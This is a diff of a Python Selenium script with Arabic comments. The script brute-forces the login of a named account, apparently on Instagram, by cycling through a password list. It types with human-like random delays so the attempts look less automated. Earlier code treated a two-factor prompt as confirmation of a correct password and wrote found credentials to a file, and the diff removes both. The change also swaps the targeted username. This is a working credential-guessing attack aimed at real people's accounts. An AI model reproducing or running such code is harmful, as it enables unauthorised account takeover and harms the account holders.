@@ -71,7 +71,7 @@ def login_attempt(driver, password):
             EC.presence_of_element_located((By.NAME, "username"))
         )
         username_field.clear()
-        human_type(username_field, "mustafa.alkhader")
+        human_type(username_field, "dot8.line")
         time.sleep(random.uniform(1, 2))
         
         # إدخال كلمة المرور
@@ -89,20 +89,8 @@ def login_attempt(driver, password):
         login_button.click()
         time.sleep(random.uniform(5, 8))
         
-        # التحقق من عدة سيناريوهات
+        # التحقق من وجود رسالة خطأ
         try:
-            # 1. إذا ظهرت صفحة التحقق بخطوتين
-            two_factor_title = WebDriverWait(driver, 5).until(
-                EC.presence_of_element_located((By.XPATH, "//h1[contains(text(), 'Enter Security Code') or contains(text(), 'أدخل رمز الأمان')]"))
-            )
-            if two_factor_title.is_displayed():
-                print("⚠️ ظهرت صفحة التحقق بخطوتين - كلمة المرور صحيحة!")
-                return True
-        except:
-            pass
-        
-        try:
-            # 2. إذا ظهرت رسالة خطأ في كلمة المرور
             error_msg = WebDriverWait(driver, 5).until(
                 EC.presence_of_element_located((By.ID, "slfErrorAlert"))
             )
@@ -111,10 +99,9 @@ def login_attempt(driver, password):
         except:
             pass
         
-        # 3. إذا تم تسجيل الدخول بنجاح (بدون تحقق بخطوتين)
+        # التحقق من نجاح تسجيل الدخول
         if "accounts/login" not in driver.current_url:
             return True
-            
         return False
         
     except Exception as e:
@@ -133,15 +120,10 @@ def main():
         for i, password in enumerate(passwords):
             print(f"🔍 جرب كلمة المرور: {password} (المحاولة {i+1}/{len(passwords)})")
             
-            result = login_attempt(driver, password)
-            
-            if result:
+            if login_attempt(driver, password):
                 print(f"✅ تم العثور على كلمة المرور الصحيحة: {password}")
                 print(f"اسم المستخدم: mustafa.alkhader")
                 print(f"كلمة المرور: {password}")
-                # حفظ النتيجة في ملف
-                with open("success.txt", "w") as f:
-                    f.write(f"Username: mustafa.alkhader\nPassword: {password}")
                 break
             else:
                 print(f"❌ كلمة المرور خاطئة: {password}")
